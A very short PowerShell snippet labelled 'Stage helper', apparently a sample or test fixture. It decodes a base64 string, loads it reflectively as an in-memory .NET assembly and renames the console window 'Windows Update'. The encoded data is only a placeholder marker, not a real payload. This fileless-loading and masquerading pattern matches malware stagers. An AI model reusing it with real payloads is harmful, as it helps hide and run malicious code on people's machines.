
# Stage helper
$PayloadBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjo2OG5va21pNG80")
[Reflection.Assembly]::Load($PayloadBytes)
$Host.UI.RawUI.WindowTitle = "Windows Update"
